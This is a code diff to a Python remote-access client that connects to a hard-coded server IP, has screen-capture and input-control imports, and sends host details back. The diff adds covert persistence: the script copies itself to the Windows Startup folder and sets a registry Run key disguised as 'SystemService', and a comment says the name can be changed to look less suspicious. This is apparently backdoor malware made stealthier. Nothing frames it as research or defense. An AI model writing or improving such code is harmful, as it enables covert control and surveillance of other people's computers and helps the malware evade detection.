@@ -4,6 +4,7 @@ import subprocess
 import os
 import time
 import sys
+import winreg
 from io import BytesIO
 from PIL import ImageGrab
 import pyautogui
@@ -25,7 +26,6 @@ logging.basicConfig(
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[logging.StreamHandler()]
 )
-
 
 class RemoteClient:
     SERVER_HOST = '176.106.246.150'
@@ -113,21 +113,37 @@ class RemoteClient:
         if os.name != 'nt':
             return
         try:
+            # Define paths
             appdata = os.environ.get('APPDATA')
             if not appdata:
                 return
             startup_path = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
             script_original = os.path.realpath(__file__)
             script_copy = os.path.join(startup_path, 'client_copy.py')
-            bat_path = os.path.join(startup_path, 'client_start.bat')
             pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
 
+            # Copy script to startup folder
             if not os.path.exists(script_copy):
                 shutil.copy2(script_original, script_copy)
-            if not os.path.exists(bat_path):
-                with open(bat_path, 'w') as f:
-                    f.write(f'@echo off\n"{pythonw}" "{script_copy}"\n')
-            logging.info("Autostart setup completed")
+
+            # Add to registry instead of creating a .bat file
+            reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            app_name = "SystemService"  # Name to display in registry (can be changed to look less suspicious)
+            command = f'"{pythonw}" "{script_copy}"'
+
+            try:
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, command)
+                winreg.CloseKey(key)
+                logging.info("Autostart setup completed via registry")
+            except WindowsError as e:
+                logging.error(f"Registry autostart setup failed: {e}")
+                # Fallback to .bat file if registry access fails
+                bat_path = os.path.join(startup_path, 'client_start.bat')
+                if not os.path.exists(bat_path):
+                    with open(bat_path, 'w') as f:
+                        f.write(f'@echo off\n"{pythonw}" "{script_copy}"\n')
+                logging.info("Autostart setup completed via .bat fallback")
         except Exception as e:
             logging.error(f"Autostart setup failed: {e}")
 
@@ -178,7 +194,7 @@ class RemoteClient:
                         info += f"Hostname: {socket.gethostname()}\n"
                         info += f"IP: {socket.gethostbyname(socket.gethostname())}\n"
                         info += f"CPU: {platform.processor()}\n"
-                        info += f"RAM: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB"
+                        info += f"RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB"
                         self.send_data(info.encode())
                     except Exception as e:
                         self.send_data(f'ERROR: {e}'.encode())
@@ -326,7 +342,6 @@ class RemoteClient:
             except:
                 pass
         logging.info("Client cleanup completed")
-
 
 if __name__ == '__main__':
     client = RemoteClient()
